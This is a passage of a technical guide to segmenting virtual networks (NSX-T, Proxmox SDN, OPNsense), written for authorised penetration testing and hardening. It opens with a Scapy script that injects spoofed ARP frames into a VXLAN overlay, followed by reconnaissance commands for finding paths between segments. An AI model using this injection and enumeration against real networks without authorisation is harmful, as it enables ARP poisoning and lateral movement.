inner_frame = Ether(src='DE:AD:BE:EF:CA:FE', dst='FF:FF:FF:FF:FF:FF') / \
              ARP(op='who-has', psrc='10.100.1.1', pdst='10.100.1.10')

vxlan_pkt = IP(src='10.10.50.99', dst='10.10.50.1') / \
            UDP(sport=49152, dport=4789) / \
            VXLAN(vni=100100, flags=0x08) / \
            inner_frame

send(vxlan_pkt, count=10)
"
# If successful: ARP poisoning within the overlay segment
# Mitigation: source TEP IP validation, BUM traffic suppression
```

### 10.6 Discovering Hidden Paths Between Segments

#### Methodology

```bash
# 1. Map all interfaces and routing tables on accessible hosts
ip addr show
ip route show table all
ip rule show
cat /proc/net/arp

# 2. Check for Docker/container bridges that may bridge segments
ip link show type bridge
brctl show 2>/dev/null || bridge link show

# 3. Look for VPN tunnels that cross segments
ip tunnel show
wg show 2>/dev/null
ipsec statusall 2>/dev/null

# 4. Check for proxy services that relay between segments
ss -tlnp | grep -E "(3128|8080|8888|1080)"  # Common proxy ports
netstat -rn  # Routing table anomalies

# 5. DNS enumeration across segments
# Internal DNS may resolve hosts in all segments
dig +short any internal.local
dig +short -x 10.100.2.1  # Reverse DNS for segment 2

# 6. Service mesh / sidecar discovery
ss -tlnp | grep -E "(15001|15006|15090)"  # Envoy/Istio ports
curl -s localhost:15000/clusters 2>/dev/null  # Envoy admin API

# 7. Check for IPv6 that may bypass IPv4 segmentation rules
ip -6 addr show
ip -6 route show
# Many firewalls only filter IPv4 — IPv6 link-local may be unfiltered
ping6 -c 1 ff02::1%eth0  # All nodes multicast — discover IPv6 neighbors
ip -6 neigh show
```

#### Report Template for Segmentation Assessment

```
NETWORK SEGMENTATION PENETRATION TEST REPORT

1. Scope
   - Segments tested: [list]
   - Source positions: [VMs/hosts used as attack origin]
   - Testing window: [UTC timestamps]
   - Authorization reference: [engagement letter ID]

2. Findings Summary
   ┌─────────────────────────────────┬──────────┬──────────┐
   │ Finding                         │ Severity │ CVSS 3.1 │
   ├─────────────────────────────────┼──────────┼──────────┤
   │ VLAN trunk exposed to VM        │ CRITICAL │ 9.1      │
   │ No macfilter on DMZ VMs         │ HIGH     │ 7.5      │
   │ Dual-homed DNS server           │ HIGH     │ 7.3      │
   │ ICMP unrestricted east-west     │ MEDIUM   │ 5.3      │
   │ Storage VLAN routable from prod │ CRITICAL │ 9.4      │
   └─────────────────────────────────┴──────────┴──────────┘

3. Detailed Findings
   [For each finding: Description, Evidence, Reproduction Steps,
    Impact, CWE ID, Remediation]

4. Segmentation Matrix (Actual vs Expected)
   
   Expected (from policy):
   ┌──────┬──────┬──────┬──────┬──────┬──────┐
   │ From │ Web  │ App  │  DB  │ Mgmt │ Stor │
   ├──────┼──────┼──────┼──────┼──────┼──────┤
   │ Web  │  -   │ 8080 │  ✗   │  ✗   │  ✗   │
   │ App  │  ✗   │  -   │ 3306 │  ✗   │  ✗   │
   │  DB  │  ✗   │  ✗   │  -   │  ✗   │ iSCSI│
   │ Mgmt │  ✓   │  ✓   │  ✓   │  -   │  ✓   │
   │ Stor │  ✗   │  ✗   │  ✗   │  ✗   │  -   │
   └──────┴──────┴──────┴──────┴──────┴──────┘

   Actual (from testing):
   ┌──────┬──────┬──────┬──────┬──────┬──────┐
   │ From │ Web  │ App  │  DB  │ Mgmt │ Stor │
   ├──────┼──────┼──────┼──────┼──────┼──────┤
   │ Web  │  -   │ ALL  │ ICMP │  ✗   │  ✗   │  ← App allows all ports
   │ App  │  ✗   │  -   │ 3306 │  ✗   │ 3260 │  ← iSCSI leak
   │  DB  │  ✗   │  ✗   │  -   │  ✗   │ iSCSI│
   │ Mgmt │  ✓   │  ✓   │  ✓   │  -   │  ✓   │
   │ Stor │  ✗   │  ✗   │  ✗   │  ✗   │  -   │
   └──────┴──────┴──────┴──────┴──────┴──────┘
```

---

## Appendix A: Complete Network Segmentation Deployment Checklist

### Pre-Deployment

- [ ] Document all existing inter-VM communication flows (2-4 week baseline)
- [ ] Classify all workloads by tier, trust level, and compliance scope
- [ ] Define zone architecture (DMZ, internal tiers, management, storage, backup)
- [ ] Design IP addressing scheme supporting segmentation
- [ ] Select segmentation technology (NSX-T DFW, Proxmox SDN, virtual firewall appliances)
- [ ] Draft initial security policies in deny-by-default model
- [ ] Obtain stakeholder sign-off on communication matrix

### Implementation

- [ ] Deploy overlay networking (VXLAN/GENEVE TEP infrastructure)
- [ ] Configure zones/VNets/segments per design
- [ ] Implement firewall rules in monitor/alert mode (do not enforce yet)
- [ ] Validate legitimate traffic flows are captured in allow rules
- [ ] Enable enforcement in phases (one zone at a time)
- [ ] Configure monitoring (IPFIX, flow logs, alerting)
- [ ] Test failover/HA for virtual firewall appliances

### Validation

- [ ] Conduct penetration test from each zone (attempt unauthorized cross-zone access)
- [ ] Verify VLAN hopping protections (macfilter, forged transmit rejection)
- [ ] Validate that management network is unreachable from production
- [ ] Test storage network isolation (iSCSI, Ceph, NFS not routable from wrong zones)
- [ ] Verify microsegmentation blocks lateral movement within zones
- [ ] Test failover scenarios (does segmentation survive HA events?)
- [ ] Document actual vs. expected communication matrix

### Operations

- [ ] Establish change management process for firewall rules
- [ ] Configure alerting for segmentation violations
- [ ] Schedule quarterly segmentation penetration tests
- [ ] Review and prune unused firewall rules quarterly
- [ ] Monitor for new workloads that may require policy updates
- [ ] Integrate segmentation policies with CI/CD (infrastructure-as-code)

---

## Appendix B: Quick Reference — Protocol and Port Matrix

```
┌──────────────────────────────────────────────────────────────────────────┐
│                    Common Segmentation-Relevant Ports                      │
├───────────────────┬────────────┬─────────────────────────────────────────┤
│ Service           │ Port(s)    │ Segmentation Notes                       │
├───────────────────┼────────────┼─────────────────────────────────────────┤
│ SSH               │ 22/tcp     │ Management-only, never cross-zone       │
│ DNS               │ 53/tcp+udp │ Dedicated DNS VMs per zone if possible  │
│ DHCP              │ 67-68/udp  │ Per-segment DHCP scope                  │
│ HTTP/HTTPS        │ 80,443/tcp │ DMZ inbound, internal per-tier          │
│ NTP               │ 123/udp    │ Dedicated NTP, all zones allowed out    │
│ SNMP              │ 161-162/udp│ Management-only (v3 encrypted)          │
│ LDAP/LDAPS        │ 389,636/tcp│ Management/auth zone only               │
│ MySQL             │ 3306/tcp   │ DB zone, from app zone only             │
│ PostgreSQL        │ 5432/tcp   │ DB zone, from app zone only             │
│ Redis             │ 6379/tcp   │ App zone internal only                  │
│ MongoDB           │ 27017/tcp  │ DB zone, from app zone only             │
│ RabbitMQ          │ 5672/tcp   │ Message bus, app zone internal          │
│ Kafka             │ 9092/tcp   │ Message bus, app zone internal          │
│ Elasticsearch     │ 9200/tcp   │ Monitoring/logging zone                 │
│ iSCSI             │ 3260/tcp   │ Storage zone exclusively                │
│ NFS               │ 2049/tcp   │ Storage zone exclusively                │
│ Ceph MON          │ 6789/tcp   │ Storage zone (public network)           │
│ Ceph OSD          │ 6800-7300  │ Storage zone (cluster network)          │
│ vCenter           │ 443/tcp    │ Management zone only                    │
│ Proxmox API       │ 8006/tcp   │ Management zone only                    │
│ ESXi mgmt         │ 443/tcp    │ Management zone only                    │
│ vMotion           │ 8000/tcp   │ Dedicated vMotion VLAN                  │
│ VXLAN (GENEVE)    │ 6081/udp   │ TEP transport network                   │
│ VXLAN (standard)  │ 4789/udp   │ TEP transport network                   │
│ BGP               │ 179/tcp    │ Network infrastructure only             │
│ IPMI/BMC          │ 623/udp    │ OOB management, physically isolated     │
│ iDRAC/iLO HTTPS   │ 443/tcp    │ OOB management VLAN only                │
│ WireGuard         │ 51820/udp  │ Encrypted overlay for storage/mgmt      │
│ IPsec (IKE)       │ 500,4500   │ Site-to-site encrypted tunnels          │
│ Prometheus scrape │ 9100/tcp   │ Monitoring zone → all zones (read-only) │
│ Syslog            │ 514/udp    │ All zones → logging zone (one-way)      │
│ NetFlow/IPFIX     │ 4739,2055  │ Switches → collector (monitoring zone)  │
│ sFlow             │ 6343/udp   │ Switches → collector (monitoring zone)  │
└───────────────────┴────────────┴─────────────────────────────────────────┘
```

---

## Appendix C: NSX-T DFW Complete Policy Example

```json
{
  "display_name": "Three-Tier-Application-Policy",
  "category": "Application",
  "stateful": true,
  "tcp_strict": true,
  "scope": ["/infra/domains/default/groups/ecommerce-app"],
  "rules": [
    {
      "display_name": "LB-to-Web-HTTPS",
      "source_groups": ["/infra/domains/default/groups/load-balancers"],
      "destination_groups": ["/infra/domains/default/groups/web-tier"],
      "services": ["/infra/services/HTTPS"],
      "action": "ALLOW",
      "direction": "IN_OUT",
      "logged": true,
      "tag": "ecommerce",
      "sequence_number": 10
    },
    {
      "display_name": "Web-to-App-REST",
      "source_groups": ["/infra/domains/default/groups/web-tier"],
      "destination_groups": ["/infra/domains/default/groups/app-tier"],
      "services": ["/infra/services/HTTPS-8443"],
      "action": "ALLOW",
      "direction": "IN_OUT",
      "logged": true,
      "sequence_number": 20
    },
    {
      "display_name": "App-to-DB-PostgreSQL",
      "source_groups": ["/infra/domains/default/groups/app-tier"],
      "destination_groups": ["/infra/domains/default/groups/db-tier"],
      "services": ["/infra/services/PostgreSQL"],
      "action": "ALLOW",
      "direction": "IN_OUT",
      "logged": true,
      "sequence_number": 30
    },
    {
      "display_name": "App-to-Cache-Redis",
      "source_groups": ["/infra/domains/default/groups/app-tier"],
      "destination_groups": ["/infra/domains/default/groups/cache-tier"],
      "services": ["/infra/services/Redis-6379"],
      "action": "ALLOW",
      "direction": "IN_OUT",
      "logged": false,
      "sequence_number": 40
    },
    {
      "display_name": "Monitoring-Scrape",
      "source_groups": ["/infra/domains/default/groups/monitoring"],
      "destination_groups": ["/infra/domains/default/groups/ecommerce-app"],
      "services": ["/infra/services/Prometheus-9100"],
      "action": "ALLOW",
      "direction": "IN_OUT",
      "logged": false,
      "sequence_number": 50
    },
    {
      "display_name": "Deny-Web-to-DB-Direct",
      "source_groups": ["/infra/domains/default/groups/web-tier"],
      "destination_groups": ["/infra/domains/default/groups/db-tier"],
      "services": ["ANY"],
      "action": "REJECT",
      "direction": "IN_OUT",
      "logged": true,
      "sequence_number": 60,
      "notes": "CRITICAL: web tier must never reach database directly"
    },
    {
      "display_name": "Deny-Lateral-Within-Web",
      "source_groups": ["/infra/domains/default/groups/web-tier"],
      "destination_groups": ["/infra/domains/default/groups/web-tier"],
      "services": ["ANY"],
      "action": "DROP",
      "direction": "IN_OUT",
      "logged": true,
      "sequence_number": 70
    },
    {
      "display_name": "Default-Deny-Ecommerce",
      "source_groups": ["ANY"],
      "destination_groups": ["/infra/domains/default/groups/ecommerce-app"],
      "services": ["ANY"],
      "action": "DROP",
      "direction": "IN_OUT",
      "logged": true,
      "sequence_number": 999
    }
  ]
}
```

---

## Appendix D: Proxmox SDN Full Configuration Example

```ini
# /etc/pve/sdn/zones.cfg
evpn: production
    controller bgp-evpn
    vrf-vxlan 10000
    exitnodes pve-node1,pve-node2
    exitnodes-primary pve-node1
    ipam pve
    dns dnsserver
    dnszone prod.internal
    reversedns 100.10.in-addr.arpa

vxlan: dmz
    peers 10.10.50.1,10.10.50.2,10.10.50.3
    ipam pve
    mtu 1450

# /etc/pve/sdn/vnets.cfg
vnet: vnet-web-prod
    zone production
    tag 100100
    alias "Production Web Tier"

vnet: vnet-app-prod
    zone production
    tag 100200
    alias "Production App Tier"

vnet: vnet-db-prod
    zone production
    tag 100300
    alias "Production Database Tier"

vnet: vnet-dmz-ext
    zone dmz
    tag 200100
    alias "DMZ External Services"

# /etc/pve/sdn/subnets.cfg
subnet: production-10.100.1.0-24
    vnet vnet-web-prod
    gateway 10.100.1.1
    snat 1
    dhcp-range start-address=10.100.1.100,end-address=10.100.1.200

subnet: production-10.100.2.0-24
    vnet vnet-app-prod
    gateway 10.100.2.1
    snat 0
    dhcp-range start-address=10.100.2.100,end-address=10.100.2.200

subnet: production-10.100.3.0-24
    vnet vnet-db-prod
    gateway 10.100.3.1
    snat 0

subnet: dmz-172.16.1.0-24
    vnet vnet-dmz-ext
    gateway 172.16.1.1
    snat 1
    dhcp-range start-address=172.16.1.50,end-address=172.16.1.100

# /etc/pve/sdn/controllers.cfg
evpn: bgp-evpn
    asn 65001
    peers 10.10.50.1,10.10.50.2,10.10.50.3

# Apply SDN configuration
pvesh set /cluster/sdn
```

---

## Appendix E: OPNsense Firewall Rules for Three-Tier Architecture

```xml
<!-- OPNsense config.xml excerpt — Firewall Rules for VLAN Interfaces -->

<filter>
  <!-- WAN Rules (minimal inbound) -->
  <rule>
    <type>pass</type>
    <interface>wan</interface>
    <ipprotocol>inet</ipprotocol>
    <protocol>tcp</protocol>
    <source><any/></source>
    <destination>
      <address>172.16.1.0/24</address>
      <port>443</port>
    </destination>
    <descr>Allow HTTPS to DMZ web servers</descr>
    <log>1</log>
  </rule>
  <rule>
    <type>block</type>
    <interface>wan</interface>
    <ipprotocol>inet46</ipprotocol>
    <source><any/></source>
    <destination><any/></destination>
    <descr>Default deny WAN inbound</descr>
    <log>1</log>
  </rule>

  <!-- DMZ Rules -->
  <rule>
    <type>pass</type>
    <interface>dmz</interface>
    <ipprotocol>inet</ipprotocol>
    <protocol>tcp</protocol>
    <source><network>dmz</network></source>
    <destination>
      <address>10.100.1.0/24</address>
      <port>8443</port>
    </destination>
    <descr>DMZ reverse proxy to internal web tier</descr>
    <log>1</log>
  </rule>
  <rule>
    <type>block</type>
    <interface>dmz</interface>
    <ipprotocol>inet</ipprotocol>
    <source><network>dmz</network></source>
    <destination>
      <address>10.0.0.0/8</address>
    </destination>
    <descr>Block DMZ to all internal (except allowed above)</descr>
    <log>1</log>
  </rule>

  <!-- Web Tier (VLAN 100) Rules -->
  <rule>
    <type>pass</type>
    <interface>vlan100</interface>
    <ipprotocol>inet</ipprotocol>
    <protocol>tcp</protocol>
    <source><address>10.100.1.0/24</address></source>
    <destination>
      <address>10.100.2.0/24</address>
      <port>8080,8443</port>
    </destination>
    <descr>Web to App tier on API ports only</descr>
    <log>0</log>
  </rule>
  <rule>
    <type>block</type>
    <interface>vlan100</interface>
    <ipprotocol>inet</ipprotocol>
    <source><address>10.100.1.0/24</address></source>
    <destination>
      <address>10.100.3.0/24</address>
    </destination>
    <descr>BLOCK: Web tier cannot reach DB tier directly</descr>
    <log>1</log>
  </rule>
  <rule>
    <type>block</type>
    <interface>vlan100</interface>
    <ipprotocol>inet</ipprotocol>
    <source><address>10.100.1.0/24</address></source>
    <destination>
      <address>10.100.1.0/24</address>
    </destination>
    <descr>BLOCK: No lateral movement within web tier</descr>
    <log>1</log>
  </rule>

  <!-- App Tier (VLAN 200) Rules -->
  <rule>
    <type>pass</type>
    <interface>vlan200</interface>
    <ipprotocol>inet</ipprotocol>
    <protocol>tcp</protocol>
    <source><address>10.100.2.0/24</address></source>
    <destination>
      <address>10.100.3.0/24</address>
      <port>5432,6379</port>
    </destination>
    <descr>App to DB tier: PostgreSQL and Redis only</descr>
    <log>0</log>
  </rule>
  <rule>
    <type>pass</type>
    <interface>vlan200</interface>
    <ipprotocol>inet</ipprotocol>
    <protocol>tcp</protocol>
    <source><address>10.100.2.0/24</address></source>
    <destination>
      <address>10.100.2.0/24</address>
      <port>5672</port>
    </destination>
    <descr>App tier internal: RabbitMQ messaging</descr>
    <log>0</log>
  </rule>

  <!-- Database Tier (VLAN 300) Rules -->
  <rule>
    <type>pass</type>
    <interface>vlan300</interface>
    <ipprotocol>inet</ipprotocol>
    <protocol>tcp</protocol>
    <source><address>10.100.3.0/24</address></source>
    <destination>
      <address>10.20.1.0/24</address>
      <port>3260</port>
    </destination>
    <descr>DB to storage: iSCSI only</descr>
    <log>0</log>
  </rule>
  <rule>
    <type>block</type>
    <interface>vlan300</interface>
    <ipprotocol>inet46</ipprotocol>
    <source><address>10.100.3.0/24</address></source>
    <destination><any/></destination>
    <descr>DB tier: deny all outbound (except storage above)</descr>
    <log>1</log>
  </rule>

  <!-- Management Rules -->
  <rule>
    <type>pass</type>
    <interface>mgmt</interface>
    <ipprotocol>inet</ipprotocol>
    <protocol>tcp</protocol>
    <source><address>10.0.10.0/24</address></source>
    <destination>
      <address>10.100.0.0/16</address>
      <port>22</port>
    </destination>
    <descr>Management SSH to all internal hosts</descr>
    <log>1</log>
  </rule>
  <rule>
    <type>pass</type>
    <interface>mgmt</interface>
    <ipprotocol>inet</ipprotocol>
    <protocol>icmp</protocol>
    <source><address>10.0.10.0/24</address></source>
    <destination><any/></destination>
    <descr>Management ICMP (monitoring)</descr>
    <log>0</log>
  </rule>
</filter>
```

---

## Appendix F: Network Diagram — Complete Segmented Virtual Infrastructure

```
                              ┌─────────────────────┐
                              │      INTERNET       │
                              └──────────┬──────────┘
                                         │
                              ┌──────────▼──────────┐
                              │  Border Router/FW   │
                              │  (Physical/Virtual)  │
                              │   BGP AS 65000       │
                              └──────────┬──────────┘
                                         │
              ┌──────────────────────────┼──────────────────────────┐
              │                          │                          │
    ┌─────────▼─────────┐    ┌──────────▼──────────┐    ┌─────────▼──────────┐
    │   Tier-0 GW       │    │   Tier-0 GW         │    │   VPN Gateway      │
    │   (NSX-T)         │    │   (Proxmox+FRR)     │    │   (WireGuard/IPsec)│
    │   or              │    │                      │    │                    │
    │   OPNsense WAN    │    │                      │    │                    │
    └─────────┬─────────┘    └──────────┬──────────┘    └─────────┬──────────┘
              │                          │                          │
    ══════════╪══════════════════════════╪══════════════════════════╪═══════
              │         DMZ ZONE (VLAN 200 / VNI 200100)           │
    ══════════╪══════════════════════════╪══════════════════════════╪═══════
              │                          │                          │
    ┌─────────▼──────┐  ┌───────────────▼──┐  ┌───────────────────▼──────┐
    │ Web Proxy/WAF  │  │ API Gateway      │  │ Mail Relay               │
    │ 172.16.1.10    │  │ 172.16.1.20      │  │ 172.16.1.30              │
    └────────────────┘  └──────────────────┘  └──────────────────────────┘
              │
    ══════════╪═══════════════════════════════════════════════════════════
              │         PRODUCTION ZONE — WEB TIER (VLAN 100 / VNI 100100)
    ══════════╪═══════════════════════════════════════════════════════════
              │
    ┌─────────▼──────┐  ┌──────────────────┐  ┌──────────────────┐
    │ Web Server 1   │  │ Web Server 2     │  │ Web Server 3     │
    │ 10.100.1.10    │  │ 10.100.1.11      │  │ 10.100.1.12      │
    └────────────────┘  └──────────────────┘  └──────────────────┘
              │ (port 8080/8443 only)
    ══════════╪═══════════════════════════════════════════════════════════
              │         PRODUCTION ZONE — APP TIER (VLAN 101 / VNI 100200)
    ══════════╪═══════════════════════════════════════════════════════════
              │
    ┌─────────▼──────┐  ┌──────────────────┐  ┌──────────────────┐
    │ App Server 1   │  │ App Server 2     │  │ Worker Node 1    │
    │ 10.100.2.10    │  │ 10.100.2.11      │  │ 10.100.2.20      │
    └────────────────┘  └──────────────────┘  └──────────────────┘
              │ (port 5432/6379 only)
    ══════════╪═══════════════════════════════════════════════════════════
              │         PRODUCTION ZONE — DB TIER (VLAN 102 / VNI 100300)
    ══════════╪═══════════════════════════════════════════════════════════
              │
    ┌─────────▼──────┐  ┌──────────────────┐  ┌──────────────────┐
    │ PostgreSQL Pri │  │ PostgreSQL Rep   │  │ Redis Cluster    │
    │ 10.100.3.10    │  │ 10.100.3.11      │  │ 10.100.3.20-22   │
    └────────────────┘  └──────────────────┘  └──────────────────┘
              │ (port 3260 iSCSI only)
    ══════════╪═══════════════════════════════════════════════════════════
              │         STORAGE ZONE (VLAN 20 / dedicated NICs)
    ══════════╪═══════════════════════════════════════════════════════════
              │
    ┌─────────▼─────────────────────────────────────────────────────────┐
    │                    Storage Array / Ceph Cluster                    │
    │  Public Network: 10.30.1.0/24     Cluster Network: 10.30.2.0/24  │
    │  iSCSI Portals: 10.20.1.100-101   NFS: 10.20.2.100               │
    └───────────────────────────────────────────────────────────────────┘

    ══════════════════════════════════════════════════════════════════════
              MANAGEMENT ZONE (VLAN 10 / air-gapped from production VMs)
    ══════════════════════════════════════════════════════════════════════

    ┌────────────────┐  ┌──────────────────┐  ┌──────────────────┐
    │ Proxmox UI     │  │ vCenter          │  │ Monitoring       │
    │ 10.0.10.1-3    │  │ 10.0.10.50       │  │ 10.0.10.100      │
    └────────────────┘  └──────────────────┘  └──────────────────┘

    ┌────────────────┐  ┌──────────────────┐  ┌──────────────────┐
    │ Jump Host      │  │ Log Collector    │  │ Backup Server    │
    │ 10.0.10.254    │  │ 10.0.10.200      │  │ 10.0.10.150      │
    └────────────────┘  └──────────────────┘  └──────────────────┘

    ══════════════════════════════════════════════════════════════════════
              OOB / BMC ZONE (VLAN 5 / physically separate switch)
    ══════════════════════════════════════════════════════════════════════

    ┌────────────────┐  ┌──────────────────┐  ┌──────────────────┐
    │ iDRAC Host-01  │  │ iDRAC Host-02    │  │ iLO Host-03      │
    │ 10.0.5.11      │  │ 10.0.5.12        │  │ 10.0.5.13        │
    └────────────────┘  └──────────────────┘  └──────────────────┘
```

---

## References

1. NIST SP 800-125B: Secure Virtual Network Configuration for Virtual Machine (VM) Protection
2. PCI-DSS v4.0: Network Segmentation Testing Guidance (Requirement 11.4.6)
3. VMware NSX-T 4.x Design Guide: Security Reference Architecture
4. CIS Benchmark for VMware ESXi 8.0
5. CIS Benchmark for Proxmox VE
6. NIST SP 800-82 Rev. 3: Guide to OT Security (Purdue Model)
7. RFC 8926: Geneve: Generic Network Virtualization Encapsulation
8. RFC 7348: Virtual eXtensible Local Area Network (VXLAN)
9. RFC 7432: BGP MPLS-Based Ethernet VPN (EVPN)
10. OWASP Network Segmentation Cheat Sheet
11. MITRE ATT&CK: Lateral Movement (TA0008)
12. VMware NSX-T Distributed Firewall Architecture Whitepaper
13. Proxmox VE Administration Guide — Chapter 12: Software Defined Network
